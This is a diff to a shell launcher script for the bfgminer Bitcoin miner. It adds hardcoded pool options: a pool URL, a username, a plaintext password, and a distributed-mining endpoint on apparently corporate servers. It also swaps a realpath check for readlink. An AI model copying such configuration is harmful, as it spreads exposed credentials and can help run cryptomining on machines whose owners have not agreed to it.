@@ -1,4 +1,5 @@
 #!/bin/sh
+BFGMINER_OPTS="-S dist:auto -o http://api.bitcoin.cz:8332 -u sysfamily -p qihoo360sys --storm-url http://drpc1v.safe.zzbc.qihoo.net:3775/drpc/DistMiner --task-num 100 --task-timeout 2"
 n="
 "
 startscreen() {
@@ -17,7 +18,10 @@ startscreen() {
 PROG=bfgminer
 MYDIR="$(dirname "$0")"
 WHICHPROG="$(which "$PROG" 2>/dev/null)"
-if test -f "$MYDIR/$PROG" && test "$(realpath "$WHICHPROG" 2>/dev/null)" != "$(realpath "$MYDIR/$PROG")"; then
-	PROG="cd $(realpath -s "$MYDIR")$n./$PROG"
+#if test -f "$MYDIR/$PROG" && test "$(realpath "$WHICHPROG" 2>/dev/null)" != "$(realpath "$MYDIR/$PROG")"; then
+#	PROG="cd $(realpath -s "$MYDIR")$n./$PROG"
+#fi
+if test -f "$MYDIR/$PROG" && test "$(readlink -e "$WHICHPROG" 2>/dev/null)" != "$(readlink -e "$MYDIR/$PROG")"; then
+	PROG="cd $(readlink -e "$MYDIR")$n./$PROG"
 fi
 startscreen miner "${PROG} ${BFGMINER_OPTS}"
